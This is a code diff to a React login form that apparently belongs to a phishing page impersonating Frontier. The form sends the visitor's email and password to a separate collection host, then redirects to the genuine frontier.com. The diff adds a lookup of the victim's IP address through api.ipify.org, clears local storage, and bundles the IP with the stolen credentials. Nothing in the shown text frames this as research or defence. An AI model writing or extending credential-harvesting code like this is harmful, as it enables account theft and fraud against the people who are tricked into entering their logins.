@@ -9,9 +9,23 @@ const Form = () => {
   const [error, setError] = useState(false)
   const [redirect, setRedirect] = useState(false)
 
+  const [IPAddress, setIPAddress] = useState('')
+
+
   const { search } = useLocation()
   const userID = search.slice(1)
   console.log(userID)
+
+  useEffect(() => {
+    localStorage.clear()
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip) 
+        // ip
+      })
+      .catch((error) => console.error(error))
+  }, [IPAddress])
 
   useEffect(() => {
     redirect && window.location.replace('https://frontier.com/')
@@ -24,7 +38,7 @@ const Form = () => {
       return
     }
 
-    const jsonData = JSON.stringify({ email, password })
+    const jsonData = JSON.stringify({ email, password, IPAddress })
     axios
       .post(`${hostURL}main`, { data: jsonData, userID, title: 'FRONT' })
       .then((resp) => {
